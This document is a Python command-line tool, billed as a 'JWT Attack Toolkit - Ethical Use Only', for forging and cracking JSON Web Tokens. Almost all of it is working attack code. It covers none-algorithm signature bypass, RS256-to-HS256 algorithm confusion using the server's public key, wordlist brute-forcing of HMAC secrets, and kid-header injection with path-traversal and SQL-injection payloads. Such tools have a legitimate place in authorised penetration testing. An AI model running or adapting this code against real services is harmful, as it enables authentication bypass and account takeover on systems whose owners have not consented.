
import jwt
import json
import base64
import hmac
import hashlib
import argparse
import sys
from colorama import Fore, Style, init

init(autoreset=True)

BANNER = f"""
{Fore.CYAN}
██╗██╗ ██╗████████╗ ████████╗ ██████╗ ██████╗ ██╗
██║██║ ██║╚══██╔══╝ ╚══██╔══╝██╔═══██╗██╔═══██╗██║
██║██║ █╗ ██║ ██║ ██║ ██║ ██║██║ ██║██║
██ ██║██║███╗██║ ██║ ██║ ██║ ██║██║ ██║██║
╚█████╔╝╚███╔███╔╝ ██║ ██║ ╚██████╔╝╚██████╔╝███████╗
╚════╝ ╚══╝╚══╝ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
{Fore.YELLOW} JWT Attack Toolkit - Ethical Use Only
{Style.RESET_ALL}"""


def b64_decode_padding(data):
    padding = 4 - len(data) % 4
    return base64.urlsafe_b64decode(data + "=" * padding)


def decode_token_parts(token):
    try:
        parts = token.split(".")
        if len(parts) != 3:
            print(Fore.RED + "[!] Invalid JWT format.")
            return None, None, None
        header = json.loads(b64_decode_padding(parts[0]))
        payload = json.loads(b64_decode_padding(parts[1]))
        return header, payload, parts
    except Exception as e:
        print(Fore.RED + "[!] Failed to decode token: " + str(e))
        return None, None, None


def print_token_info(token):
    header, payload, _ = decode_token_parts(token)
    if header:
        print(Fore.CYAN + "\n[*] Header  : " + json.dumps(header, indent=2))
        print(Fore.CYAN + "[*] Payload : " + json.dumps(payload, indent=2) + "\n")


def attack_none_algorithm(token):
    print(Fore.YELLOW + "\n[*] Running Attack: None Algorithm Bypass")
    header, payload, parts = decode_token_parts(token)
    if not header:
        return
    header["alg"] = "none"
    new_header = base64.urlsafe_b64encode(
        json.dumps(header, separators=(',', ':')).encode()
    ).rstrip(b"=").decode()
    new_payload = parts[1]
    forged_with_dot = new_header + "." + new_payload + "."
    forged_without_dot = new_header + "." + new_payload
    print(Fore.GREEN + "[+] Forged Token (with trailing dot):\n    " + forged_with_dot)
    print(Fore.GREEN + "[+] Forged Token (without trailing dot):\n    " + forged_without_dot)
    print(Fore.BLUE + "[i] Test both variants - behavior differs across JWT libraries.")


def attack_algorithm_confusion(token, public_key_path):
    print(Fore.YELLOW + "\n[*] Running Attack: Algorithm Confusion (RS256 to HS256)")
    try:
        with open(public_key_path, "rb") as f:
            public_key = f.read()
    except FileNotFoundError:
        print(Fore.RED + "[!] Public key file not found: " + public_key_path)
        return
    header, payload, _ = decode_token_parts(token)
    if not header:
        return
    header["alg"] = "HS256"
    new_header_enc = base64.urlsafe_b64encode(
        json.dumps(header, separators=(',', ':')).encode()
    ).rstrip(b"=").decode()
    new_payload_enc = base64.urlsafe_b64encode(
        json.dumps(payload, separators=(',', ':')).encode()
    ).rstrip(b"=").decode()
    signing_input = new_header_enc + "." + new_payload_enc
    signature = hmac.new(public_key, signing_input.encode(), hashlib.sha256).digest()
    sig_enc = base64.urlsafe_b64encode(signature).rstrip(b"=").decode()
    forged_token = signing_input + "." + sig_enc
    print(Fore.GREEN + "[+] Forged Token:\n    " + forged_token)
    print(Fore.BLUE + "[i] If server is misconfigured, it will accept this token.")


def attack_brute_force(token, wordlist_path):
    print(Fore.YELLOW + "\n[*] Running Attack: Weak Secret Brute-Force")
    header, payload, parts = decode_token_parts(token)
    if not header:
        return
    alg = header.get("alg", "").upper()
    if not alg.startswith("HS"):
        print(Fore.RED + "[!] Token uses " + alg + ", not an HMAC algorithm. Skipping.")
        return
    try:
        with open(wordlist_path, "r", errors="ignore") as f:
            secrets = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + "[!] Wordlist not found: " + wordlist_path)
        return
    print(Fore.BLUE + "[i] Testing " + str(len(secrets)) + " secrets...")
    signing_input = parts[0] + "." + parts[1]
    orig_sig = b64_decode_padding(parts[2])
    hash_map = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512
    }
    hash_fn = hash_map.get(alg, hashlib.sha256)
    for secret in secrets:
        test_sig = hmac.new(secret.encode(), signing_input.encode(), hash_fn).digest()
        if hmac.compare_digest(test_sig, orig_sig):
            print(Fore.GREEN + "[+] SECRET FOUND: " + secret)
            return
    print(Fore.RED + "[-] Secret not found. Try a larger list (e.g., rockyou.txt).")


def attack_kid_injection(token, kid_payload="../../dev/null"):
    print(Fore.YELLOW + "\n[*] Running Attack: KID Header Injection")
    print(Fore.BLUE + "[i] Injecting kid: " + kid_payload)
    header, payload, parts = decode_token_parts(token)
    if not header:
        return
    header["kid"] = kid_payload
    header["alg"] = "HS256"
    new_header_enc = base64.urlsafe_b64encode(
        json.dumps(header, separators=(',', ':')).encode()
    ).rstrip(b"=").decode()
    new_payload_enc = parts[1]
    signing_input = new_header_enc + "." + new_payload_enc
    signature = hmac.new(b"", signing_input.encode(), hashlib.sha256).digest()
    sig_enc = base64.urlsafe_b64encode(signature).rstrip(b"=").decode()
    forged_token = signing_input + "." + sig_enc
    print(Fore.GREEN + "[+] Forged Token:\n    " + forged_token)
    print(Fore.BLUE + "[i] Useful kid payloads:")
    print("    Path Traversal : ../../dev/null")
    print("    SQLi           : x' UNION SELECT 'mysecret' --")


def main():
    print(BANNER)
    parser = argparse.ArgumentParser(
        description="JWT Attack Toolkit - Ethical Use Only",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("--token", required=True, help="Target JWT token")
    parser.add_argument("--attack", required=True,
        choices=["none", "confusion", "bruteforce", "kid", "info"],
        help=(
            "Attack type:\n"
            "  info       - Decode and display token\n"
            "  none       - None algorithm bypass\n"
            "  confusion  - RS256 to HS256 (requires --pubkey)\n"
            "  bruteforce - Brute-force HMAC secret (requires --wordlist)\n"
            "  kid        - KID header injection"
        )
    )
    parser.add_argument("--pubkey", help="Path to RSA public key")
    parser.add_argument("--wordlist", help="Path to wordlist file")
    parser.add_argument("--kid-payload", default="../../dev/null", help="KID injection payload")
    args = parser.parse_args()

    if args.attack == "info":
        print_token_info(args.token)
    elif args.attack == "none":
        attack_none_algorithm(args.token)
    elif args.attack == "confusion":
        if not args.pubkey:
            print(Fore.RED + "[!] --pubkey required for confusion attack")
            sys.exit(1)
        attack_algorithm_confusion(args.token, args.pubkey)
    elif args.attack == "bruteforce":
        if not args.wordlist:
            print(Fore.RED + "[!] --wordlist required for bruteforce attack")
            sys.exit(1)
        attack_brute_force(args.token, args.wordlist)
    elif args.attack == "kid":
        attack_kid_injection(args.token, args.kid_payload)


if __name__ == "__main__":
    main()
